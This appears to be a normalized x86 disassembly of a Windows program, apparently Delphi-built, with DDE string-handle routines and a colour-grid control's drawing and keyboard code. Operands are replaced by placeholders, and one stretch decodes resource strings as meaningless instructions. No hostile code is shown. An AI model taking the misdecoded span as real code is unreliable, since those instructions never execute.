call DdeCreateDataHandle
mov [ ebp - 0x4 ] eax
sub_46b3d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov edi edx
test edi edi
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
call sub_41a708
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
inc esi
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404480
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x4 ]
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46b3d4
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_41a6dc
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
sub_46b4a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_413de4
mov ebx eax
mov eax [ ebx + 0x34 ]
mov edx [ esp ]
call sub_404480
jne r-xdata
sub_46b4f8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_413de4
mov ebx eax
mov eax [ esp ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call DdeCmpStringHandles
test eax eax
jne r-xdata
sub_46b54c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x30 ] ecx
xor edx edx
mov eax esi
call sub_41a0e4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_46b584
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a130
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ esi + 0x38 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_46b5c4
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46b679
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1004 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1004 ]
lea eax [ ebx + 0x34 ]
call sub_404164
cmp si 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b680
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax si
push eax
mov eax [ ebx + 0x38 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_404334
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_46b6a8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_4040c8
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
call sub_404334
test eax eax
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
push 0x3ec
mov eax [ ebx + 0x34 ]
call sub_404534
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x38 ] eax
sub_46b704
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b735
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b73c
retn
mov eax rw-data
call sub_40d01c
sub_46b740
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_469594
mov [ rw-data ] eax
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41366c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41366c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41366c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41366c
sub_46ba61
sub al 0xfe
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
movsb [ edi ] [ esi ]
mov bh 0x46
add [ edx + eax - 0x34db0100 ] al
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
adc al [ eax ]
or al 0x47
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
dec edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
jb r-xdata
adc eax 0x6f461100
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
outsb
je r-xdata
or edx [ eax + 0x61 ]
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
outsb
cmp al 0x10
inc eax
add [ edx + eax ] ah
[ eax + 0x10046ca ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
cmovbe ebp [ edi + 0x72 ]
jb r-xdata
add bh bh
sub al 0x48
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
je r-xdata
jb r-xdata
push eax
popad
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ebp + 0x2 ] ch
add bh bh
movsb [ edi ] [ esi ]
les eax [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
push ss
add [ ecx ] dl
inc edx
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jne r-xdata
adc [ eax ] al
add [ edi + eax * 2 + 0x48140044 ] dl
outsb
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x5308001d ] al
outsb
je r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
and al 0xdf
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
or dl [ eax + 0x61 ]
jb r-xdata
je r-xdata
jne r-xdata
add [ eax + 0x1 ] al
dec ecx
outsb
js r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax ] cl
push ebx
adc [ eax ] al
jo r-xdata
push edi
add [ eax ] al
[ eax ]
fld [ ebx ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
mov eax [ ebx ]
cdq
add [ eax ] al
dec [ eax - 0x21 ]
inc ebx
add [ eax ] dl
fild [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x68530800
outsd
ja r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
sbb al 0x0
or [ ebx + 0x65 ] edx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx + 0x48ff0000 ] bl
fild [ ebx ]
adc bh bl
inc ebx
add [ eax ] al
add [ eax ] al
outsb
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc esi
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
or [ ecx + eax * 2 + 0x6800 ] bh
adc [ eax ] al
push 0xcff0002
0x46
pushad

add bh bh
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
sbb ch bl
inc ebx
add [ esi + edi * 8 + 0x43 ] cl
add [ eax + 0x1 ] al
and [ eax ] al
pop es
push esi
imul esi [ ebx + 0x69 ] 0xc0656c62
adc eax [ ecx ]
mov [ edx ] al
add bh bh
mov [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
rcl [ ebx ] 0x41
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
xchg esp eax
inc edi
inc esp
add [ eax + ecx * 2 ] dl
imul ebp [ esi + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
aam 0x44
add [ eax + eax ] bh
push [ eax + 0x10043dd ]
adc [ eax ] al
0x6cff0000 0x43df
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
sub_46bfa8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] cl
mov ecx edx
mov ebx eax
test ecx ecx
jl r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ecx 0xf
jg r-xdata
cmp ecx 0x8
jge r-xdata
lea esi [ ecx + 0x4 ]
mov esi ecx
jmp r-xdata
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x10 ]
xor edx edx
call sub_41d8ec
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x10 ]
mov edx 0xff00000f
call sub_41d8ec
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ esp + 0xd ]
mov edx [ esp + 0x9 ]
mov eax [ ebx + 0x208 ]
call sub_41e100
push 0xffffffff
push 0xffffffff
lea eax [ esp + 0x9 ]
push eax
call InflateRect
push 0xff000014
push 0x2
lea edx [ esp + 0x9 ]
mov ecx 0xff000010
mov eax [ ebx + 0x208 ]
call sub_428364
jmp r-xdata
mov eax ecx
mov ebp [ ebx + 0x27c ]
cdq
idiv ebp
mov edi eax
imul edi [ ebx + 0x278 ]
mov eax ecx
cdq
idiv ebp
imul edx [ ebx + 0x274 ]
mov ebp edx
mov eax [ ebx + 0x278 ]
push eax
lea eax [ esp + 0x5 ]
push eax
mov ecx [ ebx + 0x274 ]
mov edx edi
mov eax ebp
call sub_4129d8
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov cl [ esi + 0x2 ]
mov dl [ esi + 0x1 ]
mov al [ esi ]
call sub_406af0
mov edx eax
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x10 ]
call sub_41d8ec
lea eax [ ebx + esi * 4 + 0x210 ]
mov esi eax
mov cl [ esi + 0x2 ]
mov dl [ esi + 0x1 ]
mov al [ esi ]
call sub_406af0
mov edx eax
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_41dbec
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ esp + 0xd ]
mov edx [ esp + 0x9 ]
mov eax [ ebx + 0x208 ]
call sub_41e100
jmp r-xdata
mov ebx [ ebx + 0x208 ]
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_41d8ec
mov eax [ ebx + 0x10 ]
mov dl 0x3
call sub_41d9cc
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ esp + 0xd ]
mov edx [ esp + 0x9 ]
mov eax ebx
call sub_41e100
mov eax [ ebx + 0x10 ]
mov dl 0x4
call sub_41d9cc
mov eax [ esp + 0x9 ]
sub eax 0x2
push eax
mov eax [ esp + 0x11 ]
sub eax 0x2
push eax
mov ecx [ esp + 0xd ]
add ecx 0x2
mov edx [ esp + 0x9 ]
add edx 0x2
mov eax ebx
call sub_41e100
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ esp + 0xd ]
mov edx [ esp + 0x9 ]
mov eax [ ebx + 0x208 ]
call sub_41e100
push 0xffffffff
push 0xffffffff
lea eax [ esp + 0x9 ]
push eax
call InflateRect
lea eax [ esp + 0x1 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call DrawFocusRect
jmp r-xdata
sub_46c1bc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46c451
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call SetBkMode
mov esi eax
cmp [ ebx + 0x26c ] 0x0
je r-xdata
cmp [ ebx + 0x26d ] 0x0
je r-xdata
mov eax [ ebx + 0x264 ]
cmp eax [ ebx + 0x268 ]
jne r-xdata
push esi
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call SetBkMode
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c458
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov eax [ ebx + 0x264 ]
cmp eax [ ebx + 0x268 ]
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
cmp [ ebx + 0x26d ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
cmp [ ebx + 0x26c ] 0x0
je r-xdata
mov eax [ ebx + eax * 4 + 0x210 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x80
setae al
mov ecx 0xff
xor edx edx
call sub_46c1b0
mov [ ebp - 0x4 ] al
cmp [ ebp - 0x3 ] 0x80
setae al
mov ecx 0xff
xor edx edx
call sub_46c1b0
mov [ ebp - 0x3 ] al
cmp [ ebp - 0x2 ] 0x80
setae al
mov ecx 0xff
xor edx edx
call sub_46c1b0
mov [ ebp - 0x2 ] al
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x3 ]
mov al [ ebp - 0x4 ]
call sub_406af0
mov edx eax
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41d400
mov eax [ ebx + 0x264 ]
cdq
idiv [ ebx + 0x27c ]
mov ecx edx
mov edi [ ebx + 0x274 ]
imul ecx edi
mov [ ebp - 0x18 ] ecx
add ecx edi
mov [ ebp - 0x10 ] ecx
mov eax [ ebx + 0x264 ]
cdq
idiv [ ebx + 0x27c ]
mov ecx eax
mov edi [ ebx + 0x278 ]
imul ecx edi
mov [ ebp - 0x14 ] ecx
add ecx edi
mov [ ebp - 0xc ] ecx
push 0x125
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_404534
push eax
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call DrawTextA
add eax 0x4
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov eax [ ebx + eax * 4 + 0x210 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x80
setae al
mov ecx 0xff
xor edx edx
call sub_46c1b0
mov [ ebp - 0x4 ] al
cmp [ ebp - 0x3 ] 0x80
setae al
mov ecx 0xff
xor edx edx
call sub_46c1b0
mov [ ebp - 0x3 ] al
cmp [ ebp - 0x2 ] 0x80
setae al
mov ecx 0xff
xor edx edx
call sub_46c1b0
mov [ ebp - 0x2 ] al
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x3 ]
mov al [ ebp - 0x4 ]
call sub_406af0
mov edx eax
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41d400
mov eax [ ebx + 0x268 ]
cdq
idiv [ ebx + 0x27c ]
mov ecx edx
mov edi [ ebx + 0x274 ]
imul ecx edi
mov [ ebp - 0x18 ] ecx
add ecx edi
mov [ ebp - 0x10 ] ecx
mov eax [ ebx + 0x268 ]
cdq
idiv [ ebx + 0x27c ]
mov ecx eax
mov edi [ ebx + 0x278 ]
imul ecx edi
mov [ ebp - 0x14 ] ecx
add ecx edi
mov [ ebp - 0xc ] ecx
push 0x125
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_404534
push eax
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call DrawTextA
add eax 0x4
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov eax [ ebx + 0x264 ]
cmp eax 0x8
jl r-xdata
mov eax [ ebx + 0x268 ]
cmp eax 0x8
jl r-xdata
sub_46c460
push ebx
mov ebx eax
cmp dl [ ebx + 0x26c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x26c ] dl
mov eax [ ebx + 0x264 ]
cmp eax [ ebx + 0x270 ]
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp [ ebx + 0x285 ] 0x0
jne r-xdata
mov edx [ ebx + 0x264 ]
mov eax ebx
call sub_46bfa8
mov eax ebx
call sub_46c1bc
mov cl 0x1
sub_46c4a4
push ebx
mov ebx eax
cmp dl [ ebx + 0x26d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x26d ] dl
mov eax [ ebx + 0x268 ]
cmp eax [ ebx + 0x270 ]
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp [ ebx + 0x285 ] 0x0
jne r-xdata
mov edx [ ebx + 0x268 ]
mov eax ebx
call sub_46bfa8
mov eax ebx
call sub_46c1bc
mov cl 0x1
sub_46c4e8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x285 ] 0x1
mov cl 0x1
mov edx [ ebx + 0x270 ]
mov eax ebx
call sub_46bfa8
mov eax ebx
call sub_46c1bc
mov edx esi
mov eax ebx
call sub_442d2c
pop esi
pop ebx
retn
sub_46c518
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x285 ] 0x0
xor ecx ecx
mov edx [ ebx + 0x270 ]
mov eax ebx
call sub_46bfa8
mov eax ebx
call sub_46c1bc
mov edx esi
mov eax ebx
call sub_442d40
pop esi
pop ebx
retn
sub_46c548
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov ebx eax
mov edx ebp
mov cl [ esp ]
mov eax ebx
call sub_443424
mov ecx [ ebx + 0x270 ]
mov edi ecx
mov esi [ ebx + 0x27c ]
mov eax esi
imul [ ebx + 0x280 ]
movzx edx [ ebp ]
cmp edx 0x27
jg r-xdata
cmp edx 0x46
jg r-xdata
je r-xdata
sub edx 0x62
je r-xdata
je r-xdata
dec eax
cmp ecx eax
je r-xdata
add edx 0xffffffe0
cmp edx 0x6
ja r-xdata
cmp [ ebx + 0x26d ] 0x0
jne r-xdata
sub edx 0x4
jne r-xdata
cmp [ ebx + 0x26c ] 0x0
jne r-xdata
sub edx 0x28
je r-xdata
xor edi edi
jmp r-xdata
mov edi ecx
inc edi
jmp r-xdata
mov edx ebp
mov cl [ esp ]
mov eax ebx
call sub_443424
jmp r-xdata
jmp [ edx * 4 + jump_table_46c598 ]
mov edx edi
mov eax ebx
call sub_46ca0c
mov edx edi
mov eax ebx
call sub_46cb60
mov eax ebx
mov si 0xffeb
call sub_40349c
jmp r-xdata
cmp [ ebx + 0x260 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_46ca98
mov edx edi
mov eax ebx
call sub_46cb60
mov eax ebx
mov si 0xffeb
call sub_40349c
jmp r-xdata
cmp [ ebx + 0x260 ] 0x0
je r-xdata
mov edx ecx
add edx esi
cmp eax edx
jle r-xdata
sub edx 0x1a
je r-xdata
mov [ ebp ] 0x0
cmp edi [ ebx + 0x270 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor edi edi
jmp r-xdata
cmp esi ecx
jg r-xdata
test ecx ecx
je r-xdata
mov edi eax
dec edi
jmp r-xdata
mov [ ebx + 0x26d ] 0x1
mov eax [ ebx + 0x268 ]
cmp eax [ ebx + 0x270 ]
jne r-xdata
mov [ ebx + 0x26c ] 0x1
mov eax [ ebx + 0x264 ]
cmp eax [ ebx + 0x270 ]
jne r-xdata
dec eax
cmp ecx eax
je r-xdata
mov edi [ ebx + 0x270 ]
add edi [ ebx + 0x27c ]
jmp r-xdata
jmp r-xdata
mov edx edi
mov eax ebx
call sub_46cb60
test ecx ecx
je r-xdata
mov edi ecx
sub edi esi
jmp r-xdata
mov edi eax
dec edi
jmp r-xdata
mov edi ecx
dec edi
jmp r-xdata
xor ecx ecx
jmp r-xdata
cmp [ ebx + 0x285 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp [ ebx + 0x285 ] 0x0
jne r-xdata
xor edi edi
jmp r-xdata
mov eax ecx
cdq
idiv esi
mov edi edx
inc edi
jmp r-xdata
mov edi eax
dec edi
jmp r-xdata
mov edi eax
sub edi esi
add edi ecx
dec edi
jmp r-xdata
mov edx [ ebx + 0x268 ]
mov eax ebx
call sub_46bfa8
mov [ ebx + 0x268 ] 0xffffffff
mov cl 0x1
mov edx [ ebx + 0x264 ]
mov eax ebx
call sub_46bfa8
mov [ ebx + 0x264 ] 0xffffffff
mov cl 0x1
sub_46c758
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440e90
xor eax eax
push ebp
push sub_46c7a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442be4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46cbe8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c7a9
mov eax [ ebp - 0x4 ]
call sub_440e98
retn
sub_46c7c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov edi [ ebp + 0xc ]
push edi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_43f3d8
mov [ esi + 0x290 ] bl
mov [ esi + 0x291 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_46cb9c
mov edi eax
test bl bl
jne r-xdata
cmp bl 0x1
jne r-xdata
cmp [ esi + 0x26c ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_46cb60
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
call sub_43e030
cmp [ esi + 0x26d ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_46ca98
jmp r-xdata
cmp [ esi + 0x260 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx edi
mov eax esi
call sub_46ca0c
cmp [ esi + 0x260 ] 0x0
je r-xdata
mov [ esi + 0x26c ] 0x1
mov eax [ esi + 0x264 ]
cmp eax [ esi + 0x270 ]
jne r-xdata
mov [ esi + 0x26d ] 0x1
mov eax [ esi + 0x268 ]
cmp eax [ esi + 0x270 ]
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp [ esi + 0x285 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp [ esi + 0x285 ] 0x0
jne r-xdata
mov edx [ esi + 0x264 ]
mov eax esi
call sub_46bfa8
mov [ esi + 0x264 ] 0xffffffff
mov cl 0x1
mov edx [ esi + 0x268 ]
mov eax esi
call sub_46bfa8
mov [ esi + 0x268 ] 0xffffffff
mov cl 0x1
sub_46c8e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43f690
cmp [ ebx + 0x291 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov ecx edi
mov edx esi
mov eax ebx
call sub_46cb9c
mov esi eax
mov al [ ebx + 0x290 ]
test al al
jne r-xdata
cmp al 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_46ca98
jmp r-xdata
mov edx esi
mov eax ebx
call sub_46cb60
mov edx esi
mov eax ebx
call sub_46ca0c
sub_46c950
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x1 ] cl
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax esi
call sub_43f738
mov [ esi + 0x291 ] 0x0
cmp [ esi + 0x290 ] 0x1
jne r-xdata
pop esi
pop ecx
pop ebp
retn 0x8
xor edx edx
mov eax esi
call sub_43e030
mov eax esi
mov si 0xffeb
call sub_40349c
sub_46c998
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41e3e0
mov eax [ ebx + 0x280 ]
test eax eax
jl r-xdata
mov cl [ ebx + 0x285 ]
mov edx [ ebx + 0x270 ]
mov eax ebx
call sub_46bfa8
mov eax ebx
call sub_46c1bc
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc eax
mov [ esp ] eax
xor ebp ebp
inc ebp
dec [ esp ]
jne r-xdata
inc esi
xor edi edi
mov esi [ ebx + 0x27c ]
test esi esi
jl r-xdata
mov eax ebp
imul [ ebx + 0x27c ]
add eax edi
xor ecx ecx
mov edx eax
mov eax ebx
call sub_46bfa8
inc edi
dec esi
jne r-xdata
sub_46ca0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x268 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x26d ] 0x0
je r-xdata
mov edx [ ebx + 0x268 ]
cmp edx [ ebx + 0x270 ]
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp [ ebx + 0x285 ] 0x0
jne r-xdata
mov edx eax
mov eax ebx
call sub_46bfa8
mov eax esi
mov [ ebx + 0x268 ] eax
cmp eax [ ebx + 0x264 ]
jne r-xdata
mov cl 0x1
mov eax ebx
call sub_46c1bc
mov eax ebx
mov si 0xffb3
call sub_40349c
mov edx [ ebx + 0x268 ]
cmp edx [ ebx + 0x270 ]
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp [ ebx + 0x285 ] 0x0
jne r-xdata
mov edx eax
mov eax ebx
call sub_46bfa8
mov cl 0x1
sub_46ca98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x264 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x26c ] 0x0
je r-xdata
mov edx [ ebx + 0x264 ]
cmp edx [ ebx + 0x270 ]
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp [ ebx + 0x285 ] 0x0
jne r-xdata
mov edx eax
mov eax ebx
call sub_46bfa8
mov eax esi
mov [ ebx + 0x264 ] eax
cmp eax [ ebx + 0x268 ]
jne r-xdata
mov cl 0x1
mov eax ebx
call sub_46c1bc
mov eax ebx
mov si 0xffb3
call sub_40349c
mov edx [ ebx + 0x264 ]
